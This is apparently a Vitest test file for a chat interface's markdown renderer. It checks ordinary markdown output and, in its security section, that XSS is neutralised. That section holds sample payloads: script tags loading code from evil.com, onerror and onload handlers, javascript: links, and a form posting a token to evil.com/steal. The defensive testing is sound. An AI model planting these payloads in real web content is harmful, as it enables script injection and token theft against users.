// @vitest-environment happy-dom
import { beforeEach, describe, expect, it } from 'vitest'
import { MarkdownRenderer } from '../src/ui/markdown-renderer'

describe('MarkdownRenderer & XSS Security Isolation', () => {
  beforeEach(() => {
    MarkdownRenderer.init()
  })

  describe('Markdown Syntax Rendering', () => {
    it('renders standard headings h1 through h6', () => {
      const md =
        '# Heading 1\n## Heading 2\n### Heading 3\n#### Heading 4\n##### Heading 5\n###### Heading 6'
      const html = MarkdownRenderer.renderMarkdown(md)

      expect(html).toContain('<h1>Heading 1</h1>')
      expect(html).toContain('<h2>Heading 2</h2>')
      expect(html).toContain('<h3>Heading 3</h3>')
      expect(html).toContain('<h4>Heading 4</h4>')
      expect(html).toContain('<h5>Heading 5</h5>')
      expect(html).toContain('<h6>Heading 6</h6>')
    })

    it('renders inline formatting: bold, italic, strikethrough, and inline code', () => {
      const md = 'Text with **bold**, *italic*, ~~strikethrough~~, and `inline_code()`.'
      const html = MarkdownRenderer.renderMarkdown(md)

      expect(html).toContain('<strong>bold</strong>')
      expect(html).toContain('<em>italic</em>')
      expect(html).toContain('<del>strikethrough</del>')
      expect(html).toContain('<code>inline_code()</code>')
    })

    it('renders ordered and unordered lists', () => {
      const mdList = '- First item\n- Second item\n\n1. Numbered one\n2. Numbered two'
      const html = MarkdownRenderer.renderMarkdown(mdList)

      expect(html).toContain('<ul>')
      expect(html).toContain('<li>First item</li>')
      expect(html).toContain('<li>Second item</li>')
      expect(html).toContain('<ol>')
      expect(html).toContain('<li>Numbered one</li>')
      expect(html).toContain('<li>Numbered two</li>')
    })

    it('renders blockquotes with styling classes', () => {
      const md = '> This is a technical quote explaining SingleFlight request coalescing.'
      const html = MarkdownRenderer.renderMarkdown(md)

      expect(html).toContain('<blockquote>')
      expect(html).toContain(
        'This is a technical quote explaining SingleFlight request coalescing.'
      )
    })

    it('renders Markdown tables with thead and tbody', () => {
      const mdTable = `| Cache Type | Latency | Hit Rate |
| --- | --- | --- |
| Exact SHA-256 | 3.2 ms | 42.5% |
| Semantic HNSW | 35.8 ms | 21.0% |`

      const html = MarkdownRenderer.renderMarkdown(mdTable)

      expect(html).toContain('<table>')
      expect(html).toContain('<thead>')
      expect(html).toContain('<th>Cache Type</th>')
      expect(html).toContain('<tbody>')
      expect(html).toContain('<td>Exact SHA-256</td>')
      expect(html).toContain('<td>3.2 ms</td>')
    })

    it('renders fenced code blocks with language highlighting and copy button markup', () => {
      const pythonSnippet =
        '```python\ndef calculate_hit_rate(hits, total):\n    return hits / total\n```'
      const html = MarkdownRenderer.renderMarkdown(pythonSnippet)

      expect(html).toContain('code-block-wrapper')
      expect(html).toContain('<span class="code-lang">python</span>')
      expect(html).toContain('<button class="btn-copy-code"')
      expect(html).toContain('<code class="hljs language-python">')
      expect(html).toContain('hljs-keyword') // Syntax token from highlight.js
      expect(html).toContain('calculate_hit_rate')
    })

    it('renders safe external links with target="_blank" and rel="noopener noreferrer"', () => {
      const md =
        'Check the [IntelliCache Documentation](https://github.com/Guneshbari/IntelliCache).'
      const html = MarkdownRenderer.renderMarkdown(md)

      expect(html).toContain('<a href="https://github.com/Guneshbari/IntelliCache"')
      expect(html).toContain('target="_blank"')
      expect(html).toContain('rel="noopener noreferrer"')
      expect(html).toContain('IntelliCache Documentation</a>')
    })
  })

  describe('Security & XSS Neutralization Tests', () => {
    it('completely strips or neutralizes script tags from model responses', () => {
      const maliciousMd =
        'Normal text\n<script>alert("xss")</script>\n<script src="https://evil.com/payload.js"></script>'
      const html = MarkdownRenderer.renderMarkdown(maliciousMd)

      expect(html).not.toContain('<script')
      expect(html).not.toContain('</script>')
    })

    it('strips dangerous event handlers such as onerror, onload, and onclick', () => {
      const maliciousPayloads = [
        '<img src="x" onerror="alert(1)">',
        '<svg onload="alert(1)">',
        '<div onclick="alert(1)">Click me</div>',
        '<body onload="alert(1)">',
        '<button onmouseover="alert(1)">Hover</button>',
      ]

      for (const payload of maliciousPayloads) {
        const html = MarkdownRenderer.renderMarkdown(payload)
        expect(html).not.toContain('onerror=')
        expect(html).not.toContain('onload=')
        expect(html).not.toContain('onclick=')
        expect(html).not.toContain('onmouseover=')
      }
    })

    it('rejects javascript: and vbscript: URL schemes', () => {
      const maliciousLinks = [
        '[Click here](javascript:alert("pwned"))',
        '[Click here](JAVASCRIPT:alert(1))',
        '[Click here](vbscript:msgbox("xss"))',
        '<a href="javascript:alert(1)">Malicious link</a>',
      ]

      for (const link of maliciousLinks) {
        const html = MarkdownRenderer.renderMarkdown(link)
        expect(html).not.toContain('href="javascript:')
        expect(html).not.toContain('href="JAVASCRIPT:')
        expect(html).not.toContain('href="vbscript:')
      }
    })

    it('strips iframe, embed, object, and form tags', () => {
      const badTags = `
        <iframe src="https://evil.com"></iframe>
        <object data="data:text/html;base64,..."></object>
        <embed src="https://evil.com/xss.swf">
        <form action="https://evil.com/steal"><input name="token"></form>
      `
      const html = MarkdownRenderer.renderMarkdown(badTags)

      expect(html).not.toContain('<iframe')
      expect(html).not.toContain('<object')
      expect(html).not.toContain('<embed')
      expect(html).not.toContain('<form')
      expect(html).not.toContain('<input')
    })

    it('strictly escapes user messages as plain text without parsing markdown or executing HTML', () => {
      const userRawMessage = '<script>alert(1)</script> **not bold** & "quotes"'
      const escaped = MarkdownRenderer.escapeHtml(userRawMessage)

      expect(escaped).toBe(
        '&lt;script&gt;alert(1)&lt;/script&gt; **not bold** &amp; &quot;quotes&quot;'
      )
      expect(escaped).not.toContain('<script>')
      expect(escaped).not.toContain('<strong>')
    })
  })
})
